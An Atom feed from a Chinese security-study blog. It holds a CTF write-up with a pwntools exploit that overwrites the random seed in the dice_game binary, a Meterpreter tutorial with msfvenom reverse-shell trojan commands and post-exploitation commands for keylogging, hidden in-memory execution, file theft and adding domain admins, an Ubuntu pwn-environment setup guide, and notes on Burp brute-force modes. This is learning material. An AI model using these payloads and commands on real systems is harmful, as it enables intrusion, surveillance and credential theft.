<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/"/>
  <updated>2020-09-10T07:29:13.960Z</updated>
  <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-dice_game</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</id>
    <published>2022-08-09T04:02:29.862Z</published>
    <updated>2020-09-10T07:29:13.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p><p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure><p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p><p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p><p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-Checksec&quot;&gt;&lt;a href=&quot;#0x01-Checksec&quot; class=&quot;headerlink&quot; title=&quot;0x01 Checksec&quot;&gt;&lt;/a&gt;0x01 Checksec&lt;/h2&gt;&lt;p&gt;linux下checksec查壳，开启了relro </summary>
      
    
    
    
    
    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>初识Meterpreter</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/</id>
    <published>2022-08-09T03:50:57.231Z</published>
    <updated>2022-08-09T03:51:12.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>metrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。</p><blockquote><p>meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。<br>Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。</p></blockquote><h2 id="Meterpreter中常用反弹类型"><a href="#Meterpreter中常用反弹类型" class="headerlink" title="Meterpreter中常用反弹类型"></a>Meterpreter中常用反弹类型</h2><h3 id="1-reverse-tcp"><a href="#1-reverse-tcp" class="headerlink" title="1.reverse_tcp"></a>1.reverse_tcp</h3><p>基于TCP的反向链接反弹shell，使用稳定。</p><ul><li><p>Linux:</p><ul><li>linux下反弹shell木马：</li><li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li><li>目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)</li><li>设置地址和端口，开始监听。</li><li>运行反弹shell木马，成功反弹回shell</li></ul></li><li><p>Windows:</p><ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]</code></li><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li></ul></li></ul><h3 id="2-reverse-http"><a href="#2-reverse-http" class="headerlink" title="2.reverse_http"></a>2.reverse_http</h3><p>基于http方式的反向连接，网速慢的情况下不稳定。</p><p><code>payload: /windows/meterpreter/reverse_http</code></p><h3 id="3-reverse-https"><a href="#3-reverse-https" class="headerlink" title="3.reverse_https"></a>3.reverse_https</h3><p>基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。</p><p><code>payload: /windows/meterpreter/reverse_https</code></p><h3 id="4-bind-tcp"><a href="#4-bind-tcp" class="headerlink" title="4.bind_tcp"></a>4.bind_tcp</h3><p>基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。</p><p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p><p>加权运行。</p><h2 id="Meterpreter-常用命令"><a href="#Meterpreter-常用命令" class="headerlink" title="Meterpreter 常用命令"></a>Meterpreter 常用命令</h2><p>###1.基本命令</p><ul><li>help –查看Meterpreter帮助</li><li>background –返回，把meterpreter后台挂起</li><li>bgkill –杀死一个背景 meterpreter 脚本</li><li>bglist –提供所有正在运行的后台脚本的列表</li><li>bgrun –作为一个后台线程运行脚本</li><li>channel –显示活动频道</li><li>sessions -i number  –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</li><li>sesssions -k  number  –与会话进行交互</li><li>close –关闭通道</li><li>exit –终止 meterpreter 会话</li><li>quit –终止 meterpreter 会话</li><li>interact id  –切换进一个信道</li><li>run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</li><li>irb –进入 Ruby 脚本模式</li><li>read –从通道读取数据</li><li>write –将数据写入到一个通道</li><li>run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本</li><li>use –加载 meterpreter 的扩展</li><li>load/use –加载模块</li><li>Resource –执行一个已有的rc脚本</li></ul><h3 id="2-文件系统命令"><a href="#2-文件系统命令" class="headerlink" title="2.文件系统命令"></a>2.文件系统命令</h3><ul><li>cat c:\boot.ini –查看文件内容,文件必须存在</li><li>del c:\boot.ini –删除指定的文件</li><li>upload /root/Desktop/netcat.exe c:\  –上传文件到目标机主上，如upload  setup.exe C:\windows\system32\</li><li>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295******125\Msg2.0.db /root/</li><li>edit c:\boot.ini   –编辑文件</li><li>getlwd –打印本地目录</li><li>getwd –打印工作目录</li><li>lcd –更改本地目录</li><li>ls –列出在当前目录中的文件列表</li><li>lpwd –打印本地目录</li><li>pwd –输出工作目录</li><li>cd c:\  –进入目录文件下</li><li>rm file  –删除文件</li><li>mkdir dier  –在受害者系统上的创建目录</li><li>rmdir –受害者系统上删除目录</li><li>dir –列出目标主机的文件和文件夹信息</li><li>mv –修改目标主机上的文件名</li><li>search -d d:\www -f web.config  –search 文件，如search  -d c:\  -f*.doc</li><li>meterpreter &gt; search -f autoexec.bat   –搜索文件</li><li>meterpreter &gt; search -f sea*.bat c:\xamp\</li><li>enumdesktops      –用户登录数</li><li>下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</li><li>上传文件: upload 命令为上传文件到我们的目标机器</li><li>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</li><li>切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径</li><li>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。</li><li>execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令<ul><li>如果希望隐藏后台执行，加参数-H <code>execute  -H -f notepad.exe</code></li><li>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 <code>execute  -H -i -f cmd.exe</code></li><li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt" </code><ul><li>-d 在目标主机执行时显示的进程名称（用以伪装）</li><li>-m 直接从内存中执行</li><li>-o wce.txt 是wce.exe的运行参数</li></ul></li></ul></li><li>idletime命令:为显示目标机器截止到当前无操作命令的时间</li><li>search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用<code>search –h</code>命令来查看search命令的帮助信息</li><li>edit命令: 调用vi编辑器，对目标主机上的文件修改</li></ul><h3 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h3><ul><li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p></li><li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发,本机监听4444,把目标机3389转到本机4444</p></li><li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p></li><li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用rdesktop来连接桌面，-u 用户名 -p 密码</p></li><li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p></li><li><p>route –查看或修改受害者路由表</p><ul><li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li><li>route print  –路由表输出</li></ul></li><li><p>runget_local_subnets  –目标主机的内网IP段情况</p></li><li><p>Arp       –看ARP缓冲表</p></li><li><p>Getproxy     –获取代理</p></li><li><p>portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。</p></li></ul><h3 id="4-键盘监听"><a href="#4-键盘监听" class="headerlink" title="4.键盘监听"></a>4.键盘监听</h3><ul><li>keyscan_start：开启键盘记录功能</li><li>keyscan_dump：显示捕捉到的键盘记录信息</li><li>keyscan_stop：停止键盘记录功能</li><li>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</li></ul><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3><ul><li>reboot –重新启动受害人的计算机</li><li>reg –与受害人的注册表进行交互</li><li>rev2self  –回到控制目标主机的初始用户账户下</li><li>shell –获得控制台权限</li><li>shutdown –关闭了受害者的计算机</li><li>sysinfo  –查看目标机系统信息，如机器名，操作系统等</li><li>add_user username password -h ip     –在远程目标主机上添加一个用户</li><li>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是Meterpreter&quot;&gt;&lt;a href=&quot;#什么是Meterpreter&quot; class=&quot;headerlink&quot; title=&quot;什么是Meterpreter&quot;&gt;&lt;/a&gt;什么是Meterpreter&lt;/h2&gt;&lt;p&gt;metrepreter 是metasploi</summary>
      
    
    
    
    
    <category term="chrome" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu16.04重装之各种环境搭建</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-08-09T03:49:00.287Z</published>
    <updated>2022-08-09T03:49:10.368Z</updated>
    
    <content type="html"><![CDATA[<p>环境：ubuntu16.04</p><h1 id="0x00-vmtools解决坑点"><a href="#0x00-vmtools解决坑点" class="headerlink" title="0x00 vmtools解决坑点"></a>0x00 vmtools解决坑点</h1><p>有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能……</p><p>正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。</p><p><img src="https://i.loli.net/2020/10/10/zOQ1jZT5SYip47N.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/10/10/9pYJxdtsKFEUy4M.png" alt="捕获.PNG"></p><p>建立的共享文件夹要设置属性为共享式。</p><p>搞完之后……就可以了。</p><p>此处贴一个跟我一样的暴躁博主教程：<br><a href="https://blog.csdn.net/zerolity/article/details/81206476">https://blog.csdn.net/zerolity/article/details/81206476</a></p><h1 id="0x01-pwntools安装"><a href="#0x01-pwntools安装" class="headerlink" title="0x01 pwntools安装"></a>0x01 pwntools安装</h1><p>1.安装python2.7和pip</p><p><code>sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential </code></p><p>2.升级pip：<code>sudo pip install --upgrade pip</code></p><p>更改pip的配置文件/usr/bin/pip</p><p>更改为：</p><p><img src="https://i.loli.net/2020/10/10/zGq57OjUeWcxXnM.png" alt="捕获.PNG"></p><p>3.安装pwntools：<code>sudo pip install pwntools</code></p><p>报错超时，换个阿里源就好了。</p><p>3.1 更换阿里源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br><span class="hljs-built_in">cd</span> /etc/apt <span class="hljs-comment">#切换到apt源文件</span><br><span class="hljs-built_in">mv</span> source.list sources.list_bak <span class="hljs-comment">#备份源文件</span><br>vim sources.list <span class="hljs-comment">#新建一个，直接把下面的内容copy进去</span><br></code></pre></td></tr></tbody></table></figure><p>copy的内容：</p><figure class="highlight plaintext"><figcaption><span>deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs #">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties<br>deb http://archive.canonical.com/ubuntu xenial partner<br>deb-src http://archive.canonical.com/ubuntu xenial partner<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse```<br><br>3.2 保存配置后，更新配置：`sudo apt-get update`<br><br>之后再重新步骤三的安装命令即可。<br><br>4.测试<br><br><br>![捕获.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png)<br><br>无报错，返回了'1\xc0'，成功！<br><br>所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……<br><br># 0x02 GDB及三个插件的安装<br>在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。<br>* peda:做逆向破解<br>* gef：用于debug最好<br>* gdbinit：简单版<br><br>用git下载插件：<br>`git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins`<br><br>没有git的下载：`apt-get install git`<br><br>在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：<br><br>```echo "source ~/GdbPlugins/peda/peda.py" &gt; ~/.gdbinit <br>echo "source ~/GdbPlugins/gef/gef.py" &gt; ~/.gdbinit <br>echo "source ~/GdbPlugins/gdbinit/gdbinit" &gt; ~/.gdbinit  <br></code></pre></td></tr></tbody></table></figure><h1 id="0x03-安装checksec"><a href="#0x03-安装checksec" class="headerlink" title="0x03 安装checksec"></a>0x03 安装checksec</h1><figure class="highlight plaintext"><figcaption><span>clone</span><a href="https://github.com/slimm609/checksec.sh.git">link</a></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">cd checksec.sh<br></code></pre></td></tr></tbody></table></figure><p>目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。</p><h1 id="0x04-安装docker-pikachu靶场"><a href="#0x04-安装docker-pikachu靶场" class="headerlink" title="0x04 安装docker+pikachu靶场"></a>0x04 安装docker+pikachu靶场</h1><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><ul><li>先卸载可能存在的旧版本： <code>$ sudo apt-get remove docker docker-engine docker-ce docker.io</code></li><li>更新apt包索引: <code>$ sudo apt-get update</code></li><li>安装以下包以使apt可以通过HTTPS使用存储库（repository）: <code>$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></li><li>添加Docker官方的GPG密钥： <code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></li><li>使用下面的命令来设置stable存储库： <code>$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</code></li><li>再更新一下apt包索引: <code>$ sudo apt-get update</code></li><li>安装最新版本的Docker CE：<code>$ sudo apt-get install -y docker-ce</code></li><li>查看docker服务是否启动： <code>$ systemctl status docker</code></li><li>若未启动，则启动docker服务: <code>$ sudo systemctl start docker</code></li><li>经典的hello world： <code>$ sudo docker run hello-world</code></li></ul><p><img src="https://i.loli.net/2020/10/13/kofhug8n2VNj1bx.png" alt="捕获.PNG"></p><p>如图输出则表示docker安装成功。</p><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境：ubuntu16.04&lt;/p&gt;
&lt;h1 id=&quot;0x00-vmtools解决坑点&quot;&gt;&lt;a href=&quot;#0x00-vmtools解决坑点&quot; class=&quot;headerlink&quot; title=&quot;0x00 vmtools解决坑点&quot;&gt;&lt;/a&gt;0x00 vmtools解决坑点</summary>
      
    
    
    
    
    <category term="环境搭建" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>burp四种密码爆破模式学习</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:24:09.328Z</published>
    <updated>2022-08-09T03:25:20.887Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li><li>Battering ram:多参数同时爆破，但用的是同一个字典</li><li>Pitchfork:多参数同时爆破，但用的是不同的字典</li><li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li></ul><h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p><ul><li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景</li></ul><h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1><p>（payload一对多）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p><ul><li>此模式主要适用于：撞库</li></ul><h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p><p>a:1,2</p><p>b:3,4</p><p>第一次爆破为 1，3</p><p>第二次爆破为 2，4</p><ul><li>此模式主要适用于：恶意注册</li></ul><h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1><p>（多对多）</p><p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变&lt;/li&gt;
&lt;li&gt;Battering ram:多参数同时爆破，但用的是同一个字典&lt;/li&gt;
&lt;li&gt;Pitchfork:多参数同时爆破，但用的是不同的字典&lt;/li&gt;
&lt;li&gt;Cl</summary>
      
    
    
    
    
    <category term="bp" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"/>
    
